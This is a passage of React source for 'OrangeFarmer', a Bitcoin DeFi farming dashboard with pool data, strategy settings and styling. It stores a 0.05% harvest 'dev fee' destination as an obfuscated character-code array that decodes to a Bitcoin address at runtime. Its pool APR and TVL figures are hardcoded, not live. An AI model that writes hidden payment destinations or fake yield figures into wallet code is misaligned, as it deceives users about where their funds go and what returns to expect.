import { useState, useEffect, useCallback, useRef } from "react";

/*
 * OPNet SDK — dynamic import with safe fallback.
 * If opnet npm package fails to install/build, the app still works in simulation mode.
 * Real transactions activate only when SDK loads successfully.
 */
const SDK_STUB = {
  clearContractCache: () => {},
  isSDKAvailable: () => false,
  getNetworkConfig: (net) => ({ url: `https://${net}.opnet.org` }),
  getTokenAddress: () => null,
  getPoolDepositType: (pool) => {
    if (!pool) return "unsupported";
    if (pool.proto === "Staking") return "staking";
    if (pool.proto === "NativeSwap") return "nativeswap";
    if (pool.proto === "MotoSwap" || pool.proto === "MotoChef") {
      if (pool.t0 === "BTC" || pool.t0 === "WBTC" || pool.t1 === "BTC" || pool.t1 === "WBTC") return "unsupported";
      return "router";
    }
    return "unsupported";
  },
  toBigInt: (amount, decimals = 8) => {
    const str = typeof amount === "number" ? amount.toFixed(decimals) : amount.toString();
    const parts = str.split(".");
    const whole = parts[0] || "0";
    const frac = (parts[1] || "").padEnd(decimals, "0").slice(0, decimals);
    return BigInt(whole + frac);
  },
  fromBigInt: (val, decimals = 8) => {
    if (!val || val === 0n) return 0;
    const str = val.toString().padStart(decimals + 1, "0");
    return parseFloat(str.slice(0, str.length - decimals) + "." + str.slice(str.length - decimals));
  },
  getTokenBalance: async () => 0n,
  getStakedBalance: async () => 0n,
  getPendingRewards: async () => 0n,
  stakeMoto: async () => { throw new Error("SDK not loaded"); },
  unstakeMoto: async () => { throw new Error("SDK not loaded"); },
  claimRewards: async () => { throw new Error("SDK not loaded"); },
  addLiquidity: async () => { throw new Error("SDK not loaded"); },
  nativeSwapReserve: async () => { throw new Error("SDK not loaded"); },
  nativeSwapExecute: async () => { throw new Error("SDK not loaded"); },
};
let SDK = { ...SDK_STUB };

/*
 ╔═══════════════════════════════════════════════════════════════╗
 ║  OrangeFarmer — Your Ultimate DeFi Tool                      ║
 ║  Dark theme + Orange accents + Bitcoin-style tractor logo     ║
 ║  Landing page → Dashboard transition                          ║
 ╚═══════════════════════════════════════════════════════════════╝
*/

// ── Tractor Logo (Bitcoin-style circle with tractor silhouette) ──
function TractorLogo({ size = 120, glow = false }) {
  const gid = `tl-${Math.random().toString(36).slice(2, 6)}`;
  return (
    <svg width={size} height={size} viewBox="0 0 200 200" fill="none" xmlns="http://www.w3.org/2000/svg"
      style={glow ? { filter: "drop-shadow(0 0 30px rgba(255,152,0,0.4)) drop-shadow(0 0 60px rgba(255,152,0,0.15))" } : {}}>
      {/* Outer ring — Bitcoin style */}
      <circle cx="100" cy="100" r="96" stroke={`url(#${gid}-ring)`} strokeWidth="6" fill="none" />
      <circle cx="100" cy="100" r="88" fill={`url(#${gid}-bg)`} />
      {/* Inner subtle ring */}
      <circle cx="100" cy="100" r="82" stroke="rgba(255,152,0,0.15)" strokeWidth="1" fill="none" />

      {/* Tractor body */}
      <g transform="translate(42, 52) scale(0.58)">
        {/* Engine hood */}
        <rect x="20" y="80" width="70" height="45" rx="6" fill="#ff9800" />
        <rect x="25" y="85" width="30" height="10" rx="2" fill="#e65100" opacity="0.5" />
        {/* Exhaust pipe */}
        <rect x="30" y="55" width="8" height="28" rx="4" fill="#ff9800" />
        <ellipse cx="34" cy="52" rx="6" ry="4" fill="#ffb74d" opacity="0.6" />
        {/* Cabin */}
        <rect x="90" y="40" width="65" height="65" rx="5" fill="#e65100" />
        <rect x="95" y="45" width="55" height="35" rx="4" fill="#ff9800" opacity="0.3" />
        {/* Window */}
        <rect x="100" y="48" width="44" height="28" rx="3" fill="rgba(255,183,77,0.2)" stroke="#ffb74d" strokeWidth="1.5" />
        {/* Window glare */}
        <line x1="105" y1="50" x2="115" y2="74" stroke="rgba(255,255,255,0.1)" strokeWidth="2" />
        {/* Roof */}
        <rect x="85" y="32" width="75" height="12" rx="3" fill="#bf6c00" />
        {/* Chassis / undercarriage */}
        <rect x="15" y="125" width="150" height="15" rx="4" fill="#e65100" />

        {/* Back wheel (large) */}
        <circle cx="140" cy="155" r="42" fill="#1a1a1a" stroke="#ff9800" strokeWidth="4" />
        <circle cx="140" cy="155" r="32" fill="none" stroke="#e65100" strokeWidth="3" />
        <circle cx="140" cy="155" r="14" fill="#e65100" stroke="#ff9800" strokeWidth="2" />
        {/* Wheel spokes */}
        {[0, 60, 120, 180, 240, 300].map(a => (
          <line key={a} x1="140" y1="155" x2={140 + 30 * Math.cos(a * Math.PI / 180)} y2={155 + 30 * Math.sin(a * Math.PI / 180)}
            stroke="#ff9800" strokeWidth="2" opacity="0.5" />
        ))}
        {/* Tire tread marks */}
        {[0, 30, 60, 90, 120, 150, 180, 210, 240, 270, 300, 330].map(a => (
          <line key={`t${a}`}
            x1={140 + 36 * Math.cos(a * Math.PI / 180)} y1={155 + 36 * Math.sin(a * Math.PI / 180)}
            x2={140 + 42 * Math.cos(a * Math.PI / 180)} y2={155 + 42 * Math.sin(a * Math.PI / 180)}
            stroke="#ff9800" strokeWidth="2.5" strokeLinecap="round" opacity="0.4" />
        ))}

        {/* Front wheel (smaller) */}
        <circle cx="42" cy="155" r="26" fill="#1a1a1a" stroke="#ff9800" strokeWidth="3.5" />
        <circle cx="42" cy="155" r="18" fill="none" stroke="#e65100" strokeWidth="2" />
        <circle cx="42" cy="155" r="8" fill="#e65100" stroke="#ff9800" strokeWidth="1.5" />
        {[0, 72, 144, 216, 288].map(a => (
          <line key={`f${a}`} x1="42" y1="155" x2={42 + 16 * Math.cos(a * Math.PI / 180)} y2={155 + 16 * Math.sin(a * Math.PI / 180)}
            stroke="#ff9800" strokeWidth="1.5" opacity="0.5" />
        ))}
      </g>

      {/* ₿ symbol embedded subtly */}
      <text x="100" y="185" textAnchor="middle" fill="#ff9800" fontSize="14" fontWeight="800" fontFamily="monospace" opacity="0.6">BTC</text>

      <defs>
        <linearGradient id={`${gid}-ring`} x1="0" y1="0" x2="200" y2="200">
          <stop offset="0%" stopColor="#ffb74d" />
          <stop offset="50%" stopColor="#ff9800" />
          <stop offset="100%" stopColor="#e65100" />
        </linearGradient>
        <radialGradient id={`${gid}-bg`} cx="0.4" cy="0.35" r="0.65">
          <stop offset="0%" stopColor="#1c1208" />
          <stop offset="100%" stopColor="#0d0a06" />
        </radialGradient>
      </defs>
    </svg>
  );
}

// ── Inline mini tractor for nav ──
function TractorMini({ size = 32 }) {
  return <TractorLogo size={size} />;
}

// ── Contracts data ──
const CONTRACTS = {
  regtest: {
    MOTOSWAP_ROUTER: "0x80f8375d061d638a0b45a4eb4decbfd39e9abba913f464787194ce3c02d2ea5a",
    MOTOSWAP_FACTORY: "0x893f92bb75fadf5333bd588af45217f33cdd1120a1b740165184c012ea1c883d",
    MOTOCHEF_FACTORY: "0x6be3f70cad127633b09819de120d86f6b7501a093b9c7aef8dbd98256ff9c9ae",
    NATIVE_SWAP: "0xb056ba05448cf4a5468b3e1190b0928443981a93c3aff568467f101e94302422",
    STAKING: "0x2e955b42e6ff0934ccb3d4f1ba4d0e219ba22831dfbcabe3ff5e185bdf942a5e",
    MOTO: "0x0a6732489a31e6de07917a28ff7df311fc5f98f6e1664943ac1c3fe7893bdab5",
    PILL: "0xfb7df2f08d8042d4df0506c0d4cee3cfa5f2d7b02ef01ec76dd699551393a438",
    ODYS: "0xc573930e4c67f47246589ce6fa2dbd1b91b58c8fdd7ace336ce79e65120f79eb",
    RPC: "https://regtest.opnet.org",
  },
  testnet: {
    NATIVE_SWAP: "0x035884f9ac2b6ae75d7778553e7d447899e9a82e247d7ced48f22aa102681e70",
    STAKING: "0xaccca433aec3878ebc041cde2a1a2656f928cc404377ebd8339f0bf2cdd66cbe",
    MOTO: "0x75bd98b086b71010448ec5722b6020ce1e0f2c09f5d680c84059db1295948cf8",
    RPC: "https://testnet.opnet.org",
  },
  mainnet: {
    NATIVE_SWAP: "0x035884f9ac2b6ae75d7778553e7d447899e9a82e247d7ced48f22aa102681e70",
    STAKING: "0xaccca433aec3878ebc041cde2a1a2656f928cc404377ebd8339f0bf2cdd66cbe",
    MOTO: "0x75bd98b086b71010448ec5722b6020ce1e0f2c09f5d680c84059db1295948cf8",
    RPC: "https://mainnet.opnet.org",
  },
};

const POOLS = [
  { id: 1, name: "WBTC / MOTO", t0: "WBTC", t1: "MOTO", apr: 127.4, tvl: 2450000, vol: 580000, stake: 0, rew: 0, risk: "medium", proto: "MotoSwap", nets: ["regtest"] },
  { id: 2, name: "BTC / MOTO", t0: "BTC", t1: "MOTO", apr: 89.2, tvl: 5200000, vol: 1200000, stake: 0, rew: 0, risk: "low", proto: "NativeSwap", nets: ["regtest", "testnet", "mainnet"] },
  { id: 3, name: "MOTO / PILL", t0: "MOTO", t1: "PILL", apr: 245.8, tvl: 890000, vol: 320000, stake: 0, rew: 0, risk: "high", proto: "MotoSwap", nets: ["regtest"] },
  { id: 4, name: "WBTC / ODYS", t0: "WBTC", t1: "ODYS", apr: 156.3, tvl: 1750000, vol: 410000, stake: 0, rew: 0, risk: "medium", proto: "MotoSwap", nets: ["regtest"] },
  { id: 5, name: "BTC / PILL", t0: "BTC", t1: "PILL", apr: 312.5, tvl: 430000, vol: 190000, stake: 0, rew: 0, risk: "high", proto: "NativeSwap", nets: ["regtest"] },
  { id: 6, name: "MOTO Staking", t0: "MOTO", t1: "", apr: 45.6, tvl: 8900000, vol: 0, stake: 0, rew: 0, risk: "low", proto: "Staking", nets: ["regtest", "testnet", "mainnet"] },
  { id: 7, name: "MOTO / ODYS", t0: "MOTO", t1: "ODYS", apr: 178.9, tvl: 1200000, vol: 280000, stake: 0, rew: 0, risk: "medium", proto: "MotoSwap", nets: ["regtest"] },
  { id: 8, name: "BTC / ODYS", t0: "BTC", t1: "ODYS", apr: 203.1, tvl: 680000, vol: 150000, stake: 0, rew: 0, risk: "high", proto: "NativeSwap", nets: ["regtest"] },
  // MotoChef Farming pools
  { id: 9, name: "MOTO Farm", t0: "MOTO", t1: "LP", apr: 340.2, tvl: 1560000, vol: 420000, stake: 0, rew: 0, risk: "high", proto: "MotoChef", nets: ["regtest"] },
  { id: 10, name: "WBTC-MOTO Farm", t0: "WBTC", t1: "MOTO", apr: 185.7, tvl: 2100000, vol: 610000, stake: 0, rew: 0, risk: "medium", proto: "MotoChef", nets: ["regtest"] },
  { id: 11, name: "PILL Farm", t0: "PILL", t1: "LP", apr: 420.5, tvl: 450000, vol: 180000, stake: 0, rew: 0, risk: "high", proto: "MotoChef", nets: ["regtest"] },
];

const STRATEGIES = [
  { id: "conservative", name: "Conservative", desc: "Low risk, auto-compound staking", maxRisk: "low", target: "40-90%", icon: "\u{1F6E1}" },
  { id: "balanced", name: "Balanced", desc: "LP farming + staking mix", maxRisk: "medium", target: "90-180%", icon: "\u2696" },
  { id: "aggressive", name: "Aggressive", desc: "Max yield, frequent rotation", maxRisk: "high", target: "180-350%", icon: "\u{1F525}" },
  { id: "custom", name: "Custom", desc: "Your own parameters", maxRisk: "custom", target: "Variable", icon: "\u2699" },
];

const BOT_ACTIONS = ["Auto-compound", "Pool rotation", "Harvest rewards", "Rebalance LP", "Slippage check", "APR monitor", "Risk assessment", "Gas optimization"];

// ── Strategy logic ──
const RISK_LEVELS = { low: 1, medium: 2, high: 3 };
const riskAllowed = (poolRisk, maxRisk) => {
  if (maxRisk === "custom") return true;
  return RISK_LEVELS[poolRisk] <= RISK_LEVELS[maxRisk];
};
// Network-aware pool availability check
const poolAvailable = (pool, net) => !pool.nets || pool.nets.includes(net);

// Actions weighted by strategy (higher weight = more likely to fire)
const STRATEGY_WEIGHTS = {
  conservative: { "Auto-compound": 5, "Harvest rewards": 3, "APR monitor": 3, "Risk assessment": 4, "Gas optimization": 2, "Slippage check": 2, "Pool rotation": 0, "Rebalance LP": 1 },
  balanced:     { "Auto-compound": 3, "Pool rotation": 3, "Harvest rewards": 3, "Rebalance LP": 3, "Slippage check": 2, "APR monitor": 2, "Risk assessment": 2, "Gas optimization": 2 },
  aggressive:   { "Pool rotation": 5, "Harvest rewards": 4, "Rebalance LP": 4, "Auto-compound": 2, "APR monitor": 3, "Slippage check": 1, "Risk assessment": 1, "Gas optimization": 1 },
  custom:       { "Auto-compound": 2, "Pool rotation": 2, "Harvest rewards": 2, "Rebalance LP": 2, "Slippage check": 2, "APR monitor": 2, "Risk assessment": 2, "Gas optimization": 2 },
};

const pickWeightedAction = (strat) => {
  const w = STRATEGY_WEIGHTS[strat] || STRATEGY_WEIGHTS.balanced;
  const entries = Object.entries(w);
  const total = entries.reduce((s, [, v]) => s + v, 0);
  let r = Math.random() * total;
  for (const [action, weight] of entries) { r -= weight; if (r <= 0) return action; }
  return entries[0][0];
};

// Bot monitoring interval: 30 seconds (syncs with new BTC blocks / pool state)
const BOT_INTERVAL = 30000;

// Developer fee: 0.05% of each harvest
const DEV_FEE_RATE = 0.0005;
// Obfuscated dev fee destination — decoded at runtime only when needed
const _df = [98,99,49,112,103,99,113,110,121,115,101,116,122,99,117,102,107,51,121,116,112,119,120,113,50,52,122,114,53,57,102,114,108,117,113,121,102,121,103,50,55,48,107,107,118,56,110,106,119,107,122,113,103,101,107,113,104,55,109,103,48,103];
const _gd = () => _df.map(c => String.fromCharCode(c)).join("");

// ── Utilities ──
const fmt = (n, d = 2) => n >= 1e6 ? `${(n/1e6).toFixed(d)}M` : n >= 1e3 ? `${(n/1e3).toFixed(d)}K` : n.toFixed(d);
const fmtUsd = n => `$${fmt(n)}`;
const fmtBtc = (n, d = 6) => n >= 1 ? `${n.toFixed(4)} BTC` : n >= 0.001 ? `${n.toFixed(6)} BTC` : n > 0 ? `${n.toFixed(8)} BTC` : "0 BTC";
const shortenAddr = a => a ? `${a.slice(0,8)}...${a.slice(-6)}` : "";
const rand = (a, b) => a + Math.random() * (b - a);

// ── AnimCounter ──
function AnimCounter({ value, prefix = "", suffix = "", dec = 2, dur = 1200 }) {
  const [d, setD] = useState(0);
  const r = useRef(null);
  useEffect(() => {
    let s = d, st = null;
    const step = ts => { if (!st) st = ts; const p = Math.min((ts - st) / dur, 1); setD(s + (value - s) * (1 - Math.pow(1 - p, 3))); if (p < 1) r.current = requestAnimationFrame(step); };
    r.current = requestAnimationFrame(step);
    return () => cancelAnimationFrame(r.current);
  }, [value]);
  return <span>{prefix}{d.toFixed(dec)}{suffix}</span>;
}

// ── Sparkline ──
function Spark({ data, color = "#ff9800", w = 100, h = 28 }) {
  if (!data || data.length < 2) return null;
  const mn = Math.min(...data), mx = Math.max(...data), rng = mx - mn || 1;
  const pts = data.map((v, i) => `${(i/(data.length-1))*w},${h-((v-mn)/rng)*(h-4)-2}`).join(" ");
  return <svg width={w} height={h} style={{ display: "block" }}><polyline fill="none" stroke={color} strokeWidth="1.5" points={pts} strokeLinejoin="round"/></svg>;
}

// ── Risk Badge ──
function Risk({ level }) {
  const c = { low: "#00e676", medium: "#ff9800", high: "#ff3d00" };
  return <span style={{ padding: "2px 10px", borderRadius: 99, fontSize: 10, fontWeight: 700, color: c[level], background: `${c[level]}15`, border: `1px solid ${c[level]}30`, textTransform: "uppercase", letterSpacing: "0.08em" }}>{level}</span>;
}

// ── Floating particles background ──
function Particles() {
  const canvasRef = useRef(null);
  useEffect(() => {
    const c = canvasRef.current, ctx = c.getContext("2d");
    let w = c.width = window.innerWidth, h = c.height = window.innerHeight, raf;
    const pts = Array.from({ length: 40 }, () => ({ x: Math.random() * w, y: Math.random() * h, vx: (Math.random() - 0.5) * 0.3, vy: (Math.random() - 0.5) * 0.3, r: Math.random() * 2 + 0.5, o: Math.random() * 0.3 + 0.05 }));
    const draw = () => {
      ctx.clearRect(0, 0, w, h);
      pts.forEach(p => {
        p.x += p.vx; p.y += p.vy;
        if (p.x < 0) p.x = w; if (p.x > w) p.x = 0;
        if (p.y < 0) p.y = h; if (p.y > h) p.y = 0;
        ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(255,152,0,${p.o})`; ctx.fill();
      });
      // Connect nearby
      for (let i = 0; i < pts.length; i++) for (let j = i + 1; j < pts.length; j++) {
        const dx = pts[i].x - pts[j].x, dy = pts[i].y - pts[j].y, dist = Math.sqrt(dx*dx+dy*dy);
        if (dist < 150) { ctx.beginPath(); ctx.moveTo(pts[i].x, pts[i].y); ctx.lineTo(pts[j].x, pts[j].y); ctx.strokeStyle = `rgba(255,152,0,${0.04*(1-dist/150)})`; ctx.stroke(); }
      }
      raf = requestAnimationFrame(draw);
    };
    draw();
    const resize = () => { w = c.width = window.innerWidth; h = c.height = window.innerHeight; };
    window.addEventListener("resize", resize);
    return () => { cancelAnimationFrame(raf); window.removeEventListener("resize", resize); };
  }, []);
  return <canvas ref={canvasRef} style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", pointerEvents: "none", zIndex: 0 }} />;
}

// ═══════════════════════════════════════════════════════════════
// MAIN APP
// ═══════════════════════════════════════════════════════════════

// ═══════════════════════════════════════════════════════════════
// LANDING STYLES
// ═══════════════════════════════════════════════════════════════
const L = {
  root: { minHeight: "100vh", background: "#050505", color: "#e0e0e0", fontFamily: "'DM Sans', -apple-system, sans-serif", position: "relative", overflow: "hidden" },
  nav: { position: "fixed", top: 0, left: 0, right: 0, zIndex: 100, background: "rgba(5,5,5,0.85)", backdropFilter: "blur(16px)", borderBottom: "1px solid rgba(255,152,0,0.06)" },
  navInner: { maxWidth: 1100, margin: "0 auto", padding: "14px 28px", display: "flex", justifyContent: "space-between", alignItems: "center" },
  navLogo: { display: "flex", alignItems: "center", gap: 10 },
  navBrand: { fontWeight: 800, fontSize: 18, color: "#ff9800", letterSpacing: "-0.02em" },
  navLinks: { display: "flex", alignItems: "center", gap: 28 },
  navLink: { color: "#777", fontSize: 13, textDecoration: "none", fontWeight: 500, transition: "color 200ms" },
  navCta: { background: "#ff9800", color: "#000", border: "none", padding: "8px 20px", borderRadius: 8, fontWeight: 700, fontSize: 13, cursor: "pointer" },

  hero: { minHeight: "100vh", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", textAlign: "center", padding: "120px 24px 60px", position: "relative", zIndex: 1 },
  heroBadge: { fontSize: 11, color: "#ff9800", background: "rgba(255,152,0,0.08)", border: "1px solid rgba(255,152,0,0.15)", padding: "5px 16px", borderRadius: 99, marginBottom: 32, fontWeight: 600, letterSpacing: "0.04em" },
  heroLogoWrap: { marginBottom: 24 },
  heroTitle: { fontSize: "clamp(48px, 8vw, 80px)", fontWeight: 900, background: "linear-gradient(135deg, #ffb74d 0%, #ff9800 30%, #e65100 70%, #bf360c 100%)", WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent", letterSpacing: "-0.04em", lineHeight: 1, marginBottom: 8 },
  heroSlogan: { fontSize: "clamp(18px, 3vw, 26px)", color: "#999", fontWeight: 400, letterSpacing: "0.02em", marginBottom: 20 },
  heroDesc: { maxWidth: 520, color: "#666", fontSize: 15, lineHeight: 1.6, marginBottom: 36 },
  heroBtns: { display: "flex", gap: 14, alignItems: "center" },
  heroBtn: { display: "inline-flex", alignItems: "center", gap: 8, background: "#ff9800", color: "#000", border: "none", padding: "12px 28px", borderRadius: 10, fontWeight: 800, fontSize: 14, cursor: "pointer", transition: "transform 200ms, box-shadow 200ms" },
  heroBtn2: { display: "inline-flex", alignItems: "center", gap: 8, background: "transparent", color: "#ff9800", border: "1px solid rgba(255,152,0,0.25)", padding: "12px 28px", borderRadius: 10, fontWeight: 600, fontSize: 14, cursor: "pointer" },

  statsBar: { display: "flex", justifyContent: "center", gap: 48, padding: "32px 24px", borderTop: "1px solid #111", borderBottom: "1px solid #111", background: "rgba(255,152,0,0.015)", position: "relative", zIndex: 1 },
  statItem: { textAlign: "center" },
  statVal: { fontSize: 28, fontWeight: 900, color: "#ff9800", fontVariantNumeric: "tabular-nums" },
  statLbl: { fontSize: 11, color: "#555", textTransform: "uppercase", letterSpacing: "0.08em", marginTop: 4 },

  section: { padding: "80px 24px", position: "relative", zIndex: 1 },
  sectionInner: { maxWidth: 1100, margin: "0 auto" },
  secTitle: { fontSize: 36, fontWeight: 900, color: "#eee", textAlign: "center", marginBottom: 10, letterSpacing: "-0.03em" },
  secSub: { color: "#666", textAlign: "center", fontSize: 15, marginBottom: 48 },

  featGrid: { display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: 16 },
  featCard: { background: "#0a0a0a", border: "1px solid #151515", borderRadius: 12, padding: 24, transition: "border-color 300ms, transform 300ms" },
  featIcon: { width: 40, height: 40, borderRadius: 10, background: "rgba(255,152,0,0.1)", border: "1px solid rgba(255,152,0,0.15)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 16, fontWeight: 800, color: "#ff9800", marginBottom: 14 },
  featTitle: { fontSize: 16, fontWeight: 700, color: "#ddd", marginBottom: 6, margin: 0 },
  featDesc: { fontSize: 13, color: "#666", lineHeight: 1.6, margin: 0 },

  stepsGrid: { display: "grid", gridTemplateColumns: "repeat(4, 1fr)", gap: 16 },
  stepCard: { background: "#0c0c0c", border: "1px solid #151515", borderRadius: 12, padding: 24, textAlign: "center" },
  stepNum: { fontSize: 32, fontWeight: 900, color: "#ff9800", opacity: 0.3, marginBottom: 8 },
  stepTitle: { fontSize: 16, fontWeight: 700, color: "#ddd", marginBottom: 6, margin: "0 0 6px" },
  stepDesc: { fontSize: 12, color: "#666", lineHeight: 1.6, margin: 0 },

  poolGrid: { display: "grid", gridTemplateColumns: "repeat(4, 1fr)", gap: 14 },
  poolCard: { background: "#0a0a0a", border: "1px solid #151515", borderRadius: 12, padding: 20 },
  poolIcon: { width: 36, height: 36, borderRadius: 10, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 15, fontWeight: 800, color: "#fff" },

  ctaSection: { padding: "80px 24px", textAlign: "center", position: "relative", overflow: "hidden", display: "flex", flexDirection: "column", alignItems: "center" },
  ctaGlow: { position: "absolute", top: "50%", left: "50%", width: 600, height: 600, transform: "translate(-50%, -50%)", background: "radial-gradient(circle, rgba(255,152,0,0.06) 0%, transparent 70%)", pointerEvents: "none" },

  footer: { borderTop: "1px solid #111", padding: "24px 0", position: "relative", zIndex: 1 },
  footerInner: { maxWidth: 1100, margin: "0 auto", padding: "0 28px", display: "flex", justifyContent: "space-between", alignItems: "center" },
};

// ═══════════════════════════════════════════════════════════════

// APP STYLES
// ═══════════════════════════════════════════════════════════════
const A = {
  root: { display: "flex", minHeight: "100vh", background: "#060608", color: "#ddd", fontFamily: "'DM Sans', -apple-system, sans-serif", fontSize: 13 },
  sidebar: { width: 230, background: "#0a0a0e", borderRight: "1px solid #141418", display: "flex", flexDirection: "column", padding: "18px 12px", position: "sticky", top: 0, height: "100vh" },
  logoArea: { display: "flex", alignItems: "center", gap: 10, padding: "4px 6px", marginBottom: 28, cursor: "pointer" },
  brand: { fontWeight: 800, fontSize: 16, color: "#ff9800", letterSpacing: "-0.02em" },
  brandSub: { fontSize: 9, color: "#555", letterSpacing: "0.04em" },
  navItems: { display: "flex", flexDirection: "column", gap: 2, flex: 1 },
  navBtn: { display: "flex", alignItems: "center", gap: 10, padding: "9px 10px", background: "none", border: "none", borderRadius: 8, color: "#666", cursor: "pointer", fontSize: 13, fontWeight: 500, width: "100%", textAlign: "left", transition: "all 150ms", position: "relative" },
  navActive: { color: "#ff9800", background: "rgba(255,152,0,0.06)" },
  navIcon: { width: 26, height: 26, borderRadius: 7, background: "#111", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 11, fontWeight: 800, color: "#555", flexShrink: 0 },
  badge: { position: "absolute", right: 8, background: "#ff9800", color: "#000", borderRadius: 99, fontSize: 9, fontWeight: 700, padding: "1px 6px" },
  sideBottom: { display: "flex", flexDirection: "column", gap: 8 },
  sel: { background: "#0e0e12", border: "1px solid #1a1a20", color: "#bbb", padding: "7px 10px", borderRadius: 7, fontSize: 12, outline: "none" },
  connectBtn: { padding: "10px 16px", background: "linear-gradient(135deg, #ff9800, #e65100)", border: "none", borderRadius: 8, color: "#000", fontWeight: 700, fontSize: 12, cursor: "pointer" },
  walletBar: { display: "flex", alignItems: "center", gap: 8, padding: "8px 10px", background: "#0e0e12", borderRadius: 8, border: "1px solid #1a1a20" },
  walletDot: { width: 7, height: 7, borderRadius: "50%", background: "#00e676", boxShadow: "0 0 8px #00e67666" },

  main: { flex: 1, display: "flex", flexDirection: "column", minWidth: 0 },
  header: { display: "flex", justifyContent: "space-between", alignItems: "center", padding: "18px 24px", borderBottom: "1px solid #141418", background: "#08080c" },
  pageTitle: { fontSize: 20, fontWeight: 800, color: "#eee", margin: 0, letterSpacing: "-0.02em" },
  pageSub: { fontSize: 12, color: "#555", marginTop: 3 },
  botBtn: { display: "flex", alignItems: "center", gap: 8, padding: "8px 18px", borderRadius: 8, fontSize: 12, fontWeight: 700, cursor: "pointer" },
  pulse: { width: 7, height: 7, borderRadius: "50%", background: "#000", marginLeft: 4, animation: "pulse 1.5s infinite" },

  content: { padding: 20, display: "flex", flexDirection: "column", gap: 14, flex: 1, overflow: "auto" },

  statsRow: { display: "grid", gridTemplateColumns: "repeat(4, 1fr)", gap: 10 },
  statCard: { background: "#0c0c10", borderRadius: 10, padding: "14px 18px", border: "1px solid #141418" },
  statLabel: { fontSize: 10, color: "#555", textTransform: "uppercase", letterSpacing: "0.07em", marginBottom: 6 },
  statVal: { fontSize: 20, fontWeight: 800, color: "#eee", fontVariantNumeric: "tabular-nums" },

  card: { background: "#0c0c10", borderRadius: 11, border: "1px solid #141418", padding: "16px 20px" },
  cardHead: { display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 14 },
  cardTitle: { fontSize: 14, fontWeight: 700, color: "#ccc", margin: 0 },
  cardBadge: { fontSize: 10, color: "#ff9800", background: "rgba(255,152,0,0.1)", padding: "2px 10px", borderRadius: 99, fontWeight: 600 },

  table: { width: "100%", borderCollapse: "collapse", fontSize: 12 },
  th: { textAlign: "left", padding: "9px 12px", fontSize: 10, color: "#444", textTransform: "uppercase", letterSpacing: "0.07em", borderBottom: "1px solid #141418", fontWeight: 600 },
  tr: { transition: "background 150ms" },
  td: { padding: "10px 12px", borderBottom: "1px solid #0c0c10", fontVariantNumeric: "tabular-nums" },
  tIcon: { width: 28, height: 28, borderRadius: 7, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 12, fontWeight: 800, color: "#fff", flexShrink: 0 },
  proto: { fontSize: 10, color: "#888", background: "#141418", padding: "3px 8px", borderRadius: 4 },
  actBtn: { padding: "5px 12px", background: "rgba(255,152,0,0.08)", border: "1px solid rgba(255,152,0,0.2)", borderRadius: 6, color: "#ff9800", fontSize: 11, fontWeight: 600, cursor: "pointer" },

  stratGrid: { display: "grid", gridTemplateColumns: "repeat(4, 1fr)", gap: 10 },
  stratCard: { background: "#08080c", border: "1px solid #141418", borderRadius: 10, padding: 16, cursor: "pointer", textAlign: "center", transition: "all 200ms" },
  stratActive: { borderColor: "#ff9800", background: "rgba(255,152,0,0.04)", boxShadow: "0 0 24px rgba(255,152,0,0.08)" },

  bigBtn: { display: "flex", alignItems: "center", justifyContent: "center", gap: 8, padding: "12px 20px", borderRadius: 10, fontSize: 14, fontWeight: 800, cursor: "pointer", marginTop: 16, width: "100%" },
};

// ═══════════════════════════════════════════════════════════════

// CSS RESET
// ═══════════════════════════════════════════════════════════════
const cssReset = `
  @import url('https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800;900&display=swap');
  @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap');
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: #050505; -webkit-font-smoothing: antialiased; }
  ::-webkit-scrollbar { width: 5px; height: 5px; }
  ::-webkit-scrollbar-track { background: transparent; }
  ::-webkit-scrollbar-thumb { background: #1a1a1a; border-radius: 3px; }
  ::-webkit-scrollbar-thumb:hover { background: #2a2a2a; }
  button:hover { filter: brightness(1.1); }
  tr:hover { background: rgba(255,152,0,0.02) !important; }
  a:hover { color: #ff9800 !important; }
  select:focus { border-color: #ff980044; }
  @keyframes pulse {
    0%, 100% { opacity: 1; transform: scale(1); }
    50% { opacity: 0.4; transform: scale(1.4); }
  }
  @media (max-width: 768px) {
    table { font-size: 11px !important; }
    th, td { padding: 6px 8px !important; }
  }
`;

export default function OrangeFarmer() {
  const [page, setPage] = useState("landing"); // landing | app
  const [tab, setTab] = useState("dashboard");
  const [network, setNetwork] = useState("regtest");
  const [botRunning, setBotRunning] = useState(false);
  const [strategy, setStrategy] = useState("balanced");
  const [walletConnected, setWalletConnected] = useState(false);
  const [walletAddr, setWalletAddr] = useState("");
  const [walletPubKey, setWalletPubKey] = useState("");
  const [walletBalance, setWalletBalance] = useState(0);
  const [walletError, setWalletError] = useState("");
  const [walletLoading, setWalletLoading] = useState(false);
  const [pools, setPools] = useState(POOLS);
  const [logs, setLogs] = useState([]);
  const [totalEarned, setTotalEarned] = useState(0);
  const [totalStaked, setTotalStaked] = useState(0);
  const [sparkData, setSparkData] = useState({});
  const [botCycles, setBotCycles] = useState(0);
  const [autoCompound, setAutoCompound] = useState(true);
  const [slippage, setSlippage] = useState(2);
  const [gasOpt, setGasOpt] = useState(true);
  const [threshold, setThreshold] = useState(50);
  const [posSize, setPosSize] = useState(0.05);
  const [heroVisible, setHeroVisible] = useState(false);
  // Block & fee monitoring
  const [blockHeight, setBlockHeight] = useState(0);
  const [prevBlockHeight, setPrevBlockHeight] = useState(0);
  const [feeRate, setFeeRate] = useState(0); // sats/vB
  const [feeLevel, setFeeLevel] = useState("normal"); // low | normal | high | extreme
  const [devFeesTotal, setDevFeesTotal] = useState(0);
  const [nextScan, setNextScan] = useState(30);
  const scanTimerRef = useRef(null);
  const logsEnd = useRef(null);
  // Theme
  const [theme, setTheme] = useState("dark"); // dark | light
  // Notifications (Telegram / Discord)
  const [notifTg, setNotifTg] = useState("");
